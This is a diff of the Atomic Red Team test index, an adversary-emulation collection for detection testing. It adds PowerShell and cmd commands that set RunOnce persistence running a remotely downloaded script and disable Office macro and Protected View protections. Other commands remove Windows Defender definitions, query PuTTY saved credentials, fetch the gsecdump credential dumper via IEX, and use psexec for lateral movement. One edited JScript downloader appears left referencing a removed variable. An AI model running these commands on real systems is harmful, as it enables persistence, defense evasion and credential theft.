@@ -3785,13 +3785,18 @@ persistence:
           description: Thing to Run
           type: Path
           default: powershell.exe
+        reg_key_path:
+          description: Path to registry key to update
+          type: Path
+          default: HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce
       executor:
         name: powershell
+        elevation_required: true
         command: |
-          $RunOnceKey = "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
+          $RunOnceKey = "#{reg_key_path}"
           set-itemproperty $RunOnceKey "NextRun" '#{thing_to_execute} "IEX (New-Object Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat`")"'
-        cleanup_command: 'Remove-ItemProperty -Path $RunOnceKey -Name "NextRun" -Force
-          -ErrorAction Ignore
+        cleanup_command: 'Remove-ItemProperty -Path #{reg_key_path} -Name "NextRun"
+          -Force -ErrorAction Ignore
 
 '
   T1053:
@@ -7195,6 +7200,40 @@ defense-evasion:
 '
         cleanup_command: 'Set-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows
           Defender" -Name DisableAntiSpyware -Value 0
+
+'
+    - name: Disable Microft Office Security Features
+      description: |
+        Gorgon group may disable Office security features so that their code can run
+        https://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          New-Item -Path "HKCU:\Software\Microsoft\Office\16.0\Excel"
+          New-Item -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security"
+          New-Item -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView"
+          New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security" -Name "VBAWarnings" -Value "1" -PropertyType "Dword"
+          New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView" -Name "DisableInternetFilesInPV" -Value "1" -PropertyType "Dword"
+          New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView" -Name "DisableUnsafeLocationsInPV" -Value "1" -PropertyType "Dword"
+          New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView" -Name "DisableAttachementsInPV" -Value "1" -PropertyType "Dword"
+        cleanup_command: |
+          Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security" -Name "VBAWarnings"
+          Remove-Item -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView"
+    - name: Remove Windows Defender Definition Files
+      description: |
+        Removing definition files would cause ATP to not fire for AntiMalware
+        Check MpCmdRun.exe man page for info on all arguments
+        https://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/
+      supported_platforms:
+      - windows
+      executor:
+        name: command_prompt
+        elevation_required: true
+        command: '"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions
+          -All
 
 '
   T1107:
@@ -19447,12 +19486,24 @@ credential-access:
           description: Path to the Gsecdump executable
           type: Path
           default: PathToAtomicsFolder\T1003\bin\gsecdump.exe
+        gsecdump_url:
+          description: Path to download Gsecdump binary file
+          type: url
+          default: https://web.archive.org/web/20150606043951if_/http://www.truesec.se/Upload/Sakerhet/Tools/gsecdump-v2b5.exe
+        gsecdump_bin_hash:
+          description: File hash of the Gsecdump binary file
+          type: String
+          default: 94CAE63DCBABB71C5DD43F55FD09CAEFFDCD7628A02A112FB3CBA36698EF72BC
       dependency_executor_name: powershell
       dependencies:
-      - description: Windows Credential Editor must exist on disk at specified location
-          (#{gsecdump_exe})
+      - description: Gsecdump must exist on disk at specified location (#{gsecdump_exe})
         prereq_command: 'if (Test-Path #{gsecdump_exe}) {exit 0} else {exit 1}'
-        get_prereq_command: Write-Host Automated installer not implemented yet
+        get_prereq_command: |-
+          $parentpath = Split-Path "#{gsecdump_exe}"; $binpath = "$parentpath\gsecdump-v2b5.exe"
+          IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1")
+          if(Invoke-WebRequestVerifyHash "#{gsecdump_url}" "$binpath" #{gsecdump_bin_hash}){
+            Move-Item $binpath "#{gsecdump_exe}"
+          }
       executor:
         name: command_prompt
         elevation_required: true
@@ -19488,6 +19539,7 @@ credential-access:
         prereq_command: 'if (Test-Path #{wce_exe}) {exit 0} else {exit 1}'
         get_prereq_command: |-
           $parentpath = Split-Path "#{wce_exe}"; $zippath = "$parentpath\wce.zip"
+          IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1")
           if(Invoke-WebRequestVerifyHash "#{wce_url}" "$zippath" #{wce_zip_hash}){
             Expand-Archive $zippath $parentpath\wce -Force
             Move-Item $parentpath\wce\wce.exe "#{wce_exe}"
@@ -19958,6 +20010,18 @@ credential-access:
         command: |
           reg query HKLM /f password /t REG_SZ /s
           reg query HKCU /f password /t REG_SZ /s
+    - name: Enumeration for PuTTY Credentials in Registry
+      description: 'Queries to enumerate for PuTTY credentials in the Registry.
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: 'reg query HKCU\Software\SimonTatham\PuTTY\Sessions /t REG_SZ /s
+
+'
   T1179:
     technique:
       x_mitre_data_sources:
@@ -24173,7 +24237,7 @@ execution:
           default: Target
       executor:
         name: command_prompt
-        command: 'psexec \\host -u domain\user -p password -s cmd.exe
+        command: 'psexec \\#{computer_name} -u #{user_name} -p #{password} -s cmd.exe
 
 '
     - name: Invoke-Command
@@ -25646,7 +25710,7 @@ lateral-movement:
           default: Target
       executor:
         name: command_prompt
-        command: 'psexec \\host -u domain\user -p password -s cmd.exe
+        command: 'psexec \\#{computer_name} -u #{user_name} -p #{password} -s cmd.exe
 
 '
     - name: Invoke-Command
@@ -27922,18 +27986,16 @@ command-and-control:
         file_url:
           description: URL to retrieve file from
           type: Url
-          default: https://www.w3.org/TR/PNG/iso_8859-1.txt
-        out_file:
-          description: File to download payload to
-          type: Path
-          default: T1071-Out.txt
+          default: https://128.30.52.100/TR/PNG/iso_8859-1.txt
       executor:
         name: command_prompt
         elevation_required: false
         command: |
-          echo var url = "#{file_url}", filename = "#{out_file}", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > #{script_file}
+          echo var url = "#{file_url}", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > #{script_file}
           cscript //E:Jscript #{script_file}
-        cleanup_command: "del #{script_file} /F /Q\ndel #{out_file} /F /Q "
+        cleanup_command: 'del #{script_file} /F /Q
+
+'
   T1032:
     technique:
       x_mitre_data_sources:
@@ -28109,18 +28171,6 @@ command-and-control:
         device, type the following: \nnc -l -p <port>\n"
       supported_platforms:
       - windows
-      dependency_executor_name: PowerShell
-      dependencies:
-      - description: ncat.exe must be available at specified location (#{ncat_exe})
-        prereq_command: if( Test-Path "#{ncat_exe}") {exit 0} else {exit 1}
-        get_prereq_command: |-
-          $parentpath = Split-Path (Split-Path "#{ncat_exe}"); $zippath = "$parentpath\nmap.zip"
-          Invoke-WebRequest  "https://nmap.org/dist/nmap-7.80-win32.zip" -OutFile "$zippath"
-          Expand-Archive $zippath $parentpath -Force
-          $unzipPath = Join-Path $parentPath "nmap-7.80"
-          if( $null -eq (Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | ?{$_.DisplayName -like "Microsoft Visual C++*"}) ) {
-            Start-Process (Join-Path $unzipPath "vcredist_x86.exe")
-          }
       input_arguments:
         server_ip:
           description: The IP address or domain name of the listening server
@@ -28134,6 +28184,23 @@ command-and-control:
           description: The location of ncat.exe
           type: path
           default: "$env:TEMP\\T1095\\nmap-7.80\\ncat.exe"
+        ncat_path:
+          description: The folder path of ncat.exe
+          type: path
+          default: "$env:TEMP\\T1095"
+      dependency_executor_name: powerShell
+      dependencies:
+      - description: ncat.exe must be available at specified location (#{ncat_exe})
+        prereq_command: if( Test-Path "#{ncat_exe}") {exit 0} else {exit 1}
+        get_prereq_command: |-
+          New-Item -ItemType Directory -Force -Path #{ncat_path} | Out-Null
+          $parentpath = Split-Path (Split-Path "#{ncat_exe}"); $zippath = "$parentpath\nmap.zip"
+          Invoke-WebRequest  "https://nmap.org/dist/nmap-7.80-win32.zip" -OutFile "$zippath"
+            Expand-Archive $zippath $parentpath -Force
+            $unzipPath = Join-Path $parentPath "nmap-7.80"
+          if( $null -eq (Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | ?{$_.DisplayName -like "Microsoft Visual C++*"}) ) {
+            Start-Process (Join-Path $unzipPath "vcredist_x86.exe")
+          }
       executor:
         name: powershell
         elevation_required: false
